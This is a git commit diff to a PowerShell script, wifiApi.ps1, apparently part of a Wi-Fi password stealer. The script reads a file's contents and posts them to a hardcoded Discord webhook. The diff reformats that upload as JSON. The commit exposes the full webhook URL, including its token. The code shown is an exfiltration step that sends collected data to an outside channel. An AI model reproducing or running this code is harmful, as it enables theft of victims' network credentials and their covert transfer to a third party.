6c1b710e483c4f784bcecd480f7a0d14aba5eb31
berisha9625 <mehmetcakirr44@gmail.com>
2025-07-23 00:04:53 +0300

    Update wifiApi.ps1

--- wifiApi.ps1
+++ wifiApi.ps1
@@ -8,5 +8,13 @@ $fileContent = Get-Content $filePath -Raw
 # Discord webhook URL'si
 $webhookUrl = "https://discord.com/api/webhooks/1397314423084810250/BKCu31_MoFQOrfWi6ZGFGa7CXbGAcnIqeRfZXDXL7IG2Y0kRN6lYT_fxibN-8fIcBfTN"
 
-# Basit text POST isteği gönder (JSON kullanmadan)
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $fileContent -ContentType "text/plain"
+# Mesaj içeriğini obje olarak hazırla
+$bodyObject = @{
+    content = "```$fileContent```"
+}
+
+# JSON'a dönüştür
+$jsonPayload = $bodyObject | ConvertTo-Json -Depth 3
+
+# Discord'a POST gönder
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonPayload -ContentType "application/json"
